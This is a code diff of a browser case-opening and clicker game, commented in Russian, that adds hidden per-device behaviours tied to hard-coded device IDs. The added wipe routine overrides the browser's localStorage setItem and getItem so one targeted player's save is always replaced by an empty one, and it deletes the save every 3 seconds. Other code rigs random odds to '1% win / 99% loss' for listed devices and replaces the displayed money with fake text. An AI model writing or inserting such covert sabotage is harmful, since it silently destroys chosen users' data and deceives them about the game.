@@ -12,14 +12,17 @@
     'dev_g5n8q91rhtia',
   ];
 
+  // Звук + картинка на кликер
   const SOUND_IDS = [
     'dev_g5n8q91rhtia',
-  ];
-
-  const UNLUCKY_IDS = [
     'dev_02sev9mwouam',
   ];
 
+  // 1% выигрыш / 99% проигрыш (сейчас пусто — убрали)
+  const UNLUCKY_IDS = [
+  ];
+
+  // 100% обнуление прогресса
   const WIPE_IDS = [
     'dev_02sev9mwouam',
   ];
@@ -37,28 +40,62 @@
     } catch (e) { return 'unknown'; }
   }
 
-  const myId     = getDeviceId();
-  const isGod     = GOD_IDS.indexOf(myId) !== -1;
-  const isSound   = SOUND_IDS.indexOf(myId) !== -1;
-  const isUnlucky = UNLUCKY_IDS.indexOf(myId) !== -1;
+  const myId       = getDeviceId();
+  const isGod      = GOD_IDS.indexOf(myId) !== -1;
+  const isSound    = SOUND_IDS.indexOf(myId) !== -1;
+  const isUnlucky  = UNLUCKY_IDS.indexOf(myId) !== -1;
   const shouldWipe = WIPE_IDS.indexOf(myId) !== -1;
 
-  // ===== ОБНУЛЕНИЕ ПРОГРЕССА =====
+  // ===== ОБНУЛЕНИЕ + БЛОКИРОВКА СОХРАНЕНИЯ =====
   (function wipeProgress() {
     if (!shouldWipe) return;
 
-    try {
-      localStorage.removeItem(SAVE_KEY);
-      console.log('%c🧹 PROGRESS WIPED for ' + myId, 'color:#f80;font-weight:bold');
-    } catch (e) {}
+    function emptySave() {
+      return {
+        balance: 1000,
+        inventory: [],
+        stats: { opened: 0, spent: 0, earned: 0 },
+        clicks: 0,
+        clickerEarned: 0,
+        clickMultiplier: 1,
+        selectedCase: 0,
+        itemIdCounter: 0,
+        lastDaily: 0,
+        lastWheel: 0,
+        pityCounter: 0,
+        crashHistory: [],
+        musicOn: true,
+        muted: false,
+        version: 6,
+        savedAt: Date.now()
+      };
+    }
 
-    setTimeout(function () {
-      try { localStorage.removeItem(SAVE_KEY); } catch (e) {}
-    }, 1000);
+    try { localStorage.removeItem(SAVE_KEY); } catch (e) {}
 
-    setTimeout(function () {
-      try { localStorage.removeItem(SAVE_KEY); } catch (e) {}
+    const origSetItem = Storage.prototype.setItem;
+    Storage.prototype.setItem = function (key, value) {
+      if (key === SAVE_KEY) {
+        return origSetItem.call(this, key, JSON.stringify(emptySave()));
+      }
+      return origSetItem.call(this, key, value);
+    };
+
+    const origGetItem = Storage.prototype.getItem;
+    Storage.prototype.getItem = function (key) {
+      if (key === SAVE_KEY) {
+        return JSON.stringify(emptySave());
+      }
+      return origGetItem.call(this, key);
+    };
+
+    setInterval(function () {
+      try {
+        Storage.prototype.removeItem.call(localStorage, SAVE_KEY);
+      } catch (e) {}
     }, 3000);
+
+    console.log('%c🧹 PROGRESS WIPED + LOCKED for ' + myId, 'color:#f80;font-weight:bold');
   })();
 
   // ===== БЕСКОНЕЧНЫЙ БАЛАНС =====
@@ -146,7 +183,7 @@
     console.log('%c💸 Money display replaced: ' + FAKE_TEXT, 'color:#0f0;font-weight:bold');
   })();
 
-  // ===== РЕЖИМ 1% / 99% =====
+  // ===== РЕЖИМ 1% / 99% (пустой список — не сработает ни для кого) =====
   (function installUnluckyMode() {
     if (!isUnlucky) return;
     const orig = Math.random;
